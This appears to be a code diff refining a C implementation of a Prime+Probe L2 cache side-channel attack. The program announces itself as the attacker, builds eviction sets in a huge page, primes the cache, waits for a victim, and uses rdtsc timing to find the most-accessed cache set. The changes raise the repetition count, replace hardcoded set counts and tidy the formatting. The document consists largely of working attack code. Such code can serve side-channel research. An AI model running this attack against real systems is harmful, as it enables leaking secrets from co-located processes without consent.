@@ -11,16 +11,16 @@
 #define LINE_SIZE 64
 #define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)
 
-#define REPEATS 2000
+#define REPEATS 6000
 
 volatile uint8_t *buf;
 volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
 
-static inline uint64_t rdtsc(){
+static inline uint64_t rdtsc() {
     unsigned hi, lo;
-    asm volatile ("mfence");
-    asm volatile ("rdtsc" : "=a"(lo), "=d"(hi));
-    asm volatile ("mfence");
+    asm volatile("mfence");
+    asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
+    asm volatile("mfence");
     return ((uint64_t)hi << 32) | lo;
 }
 
@@ -28,19 +28,20 @@ int main() {
 
     printf("Attacker ready. Prime+Probe starting...\n");
 
-    /* allocate large buffer */
+    /* allocate 2MB huge page */
     buf = mmap(NULL,
-           2*1024*1024,
-           PROT_READ | PROT_WRITE,
-           MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
-           -1,
-           0);
+               2*1024*1024,
+               PROT_READ | PROT_WRITE,
+               MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
+               -1,
+               0);
 
     if(buf == (void*)-1){
-    perror("mmap failed");
-    exit(1);
+        perror("mmap failed");
+        exit(1);
     }
 
+    /* touch page */
     *((char*)buf) = 1;
 
     /* build eviction sets */
@@ -59,21 +60,21 @@ int main() {
         for(int r = 0; r < REPEATS; r++) {
 
             /* PRIME */
-            for(int set = 0; set < 256; set++) {
+            for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
                 for(int w = 0; w < WAYS; w++) {
                     tmp ^= *eviction_sets[set][w];
                 }
             }
 
-            /* give victim time */
+            /* allow victim to execute */
             usleep(500);
 
             /* PROBE */
-            for(int set = 0; set < 256; set++) {
+            for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
 
                 uint64_t start = rdtsc();
 
-                for(int w = WAYS-1; w >= 0; w--){
+                for(int w = WAYS-1; w >= 0; w--) {
                     tmp ^= *eviction_sets[set][w];
                 }
 
@@ -83,11 +84,12 @@ int main() {
             }
         }
 
-        /* find max latency */
+        /* find highest latency set */
         int best_set = 0;
         uint64_t max_score = 0;
 
-        for(int set = 0; set < 256; set++) {
+        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+
             uint64_t avg = scores[set] / REPEATS;
 
             if(avg > max_score) {
